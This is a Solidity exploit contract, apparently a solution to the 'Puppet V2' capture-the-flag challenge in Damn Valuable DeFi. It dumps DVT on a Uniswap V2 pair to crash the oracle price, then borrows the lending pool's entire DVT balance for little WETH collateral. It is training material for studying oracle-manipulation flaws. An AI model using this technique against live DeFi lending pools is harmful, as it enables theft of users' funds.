// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {console} from "forge-std/Test.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
import {PuppetV2Pool} from "../../src/puppet-v2/PuppetV2Pool.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IUniswapV2Router02} from "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
// import {IUniswapV2Factory} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";

contract HackPuppetV2Pool {
    address recovery;
    IUniswapV2Pair pair;
    WETH weth;
    DamnValuableToken dvt;
    PuppetV2Pool pool;
    IUniswapV2Router02 router;
    // IUniswapV2Factory factoryV2;
    constructor(
        address _recovery,
        IUniswapV2Pair _pair,
        WETH _weth,
        DamnValuableToken _dvt,
        PuppetV2Pool _pool,
        IUniswapV2Router02 _router
    ) // IUniswapV2Factory _factoryV2
    {
        recovery = _recovery;
        pair = _pair;
        weth = _weth;
        dvt = _dvt;
        pool = _pool;
        router = _router;
        // factoryV2 = _factoryV2;
    }

    function attack() external {
        // get flash loan from uniswap, with this swap we should make the value of DVT close to nothing, to do so we must dump the price by flash loaning a lot of WETH (I think)
        // with this flash loan we have to make sure to repay the dex at the end of the uniswapV2Call function and also pay the fee
        uint dvtBalance = dvt.balanceOf(address(pool));
        uint wethAmount = pool.calculateDepositOfWETHRequired(dvtBalance);
        console.log("wethAmount needed before", wethAmount);

        uint256 wethBalance = weth.balanceOf(address(pair));
        console.log("pair weth balance", wethBalance);

        console.log("weth balance before", weth.balanceOf(address(this)));

        address[] memory path = new address[](2);
        path[0] = address(dvt);
        path[1] = address(weth);

        // approve dvt for router
        uint amount1 = dvt.balanceOf(address(this));
        dvt.approve(address(router), amount1);
        // swap the tokens (dump them) into the uniswap pair using the uniswap router
        router.swapExactTokensForTokens(
            amount1,
            0, // amountOutMin: we can skip computing this number because the math is tested
            path,
            address(this),
            block.timestamp + 1000
        );

        weth.deposit{value: address(this).balance}();

        console.log("weth balance after", weth.balanceOf(address(this)));
        wethAmount = pool.calculateDepositOfWETHRequired(dvtBalance);
        console.log("wethAmount needed after", wethAmount);

        // approve weth
        weth.approve(address(pool), weth.balanceOf(address(this)));

        pool.borrow(dvtBalance);

         // send the dvt tokens to the recovery address
        dvt.transfer(address(recovery), dvt.balanceOf(address(this)));
    }

    receive() external payable {}
}
